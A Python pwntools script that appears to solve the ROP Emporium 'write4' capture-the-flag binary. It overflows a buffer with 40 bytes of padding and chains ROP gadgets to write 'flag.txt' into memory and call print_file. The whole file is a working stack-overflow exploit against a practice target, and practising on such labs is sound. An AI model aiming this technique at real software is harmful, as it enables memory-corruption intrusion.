from pwn import *
r=process('./write4')
poprdi=0x0000000000400693 #pop rdi ; ret
popr14r15=0x0000000000400690 #pop r14 ; pop r15 ; ret
movr14r15=0x0000000000400628 # mov qword ptr [r14], r15 ; ret
write_addr=0x00601028
print_file=0x400510
payload="a"*40
#write
payload+=p64(popr14r15)+p64(write_addr)+p64(u64('flag.txt'))+p64(movr14r15)
payload+=p64(poprdi)+p64(write_addr)+p64(print_file)

r.recvuntil('> ')
r.sendline(payload)
r.interactive()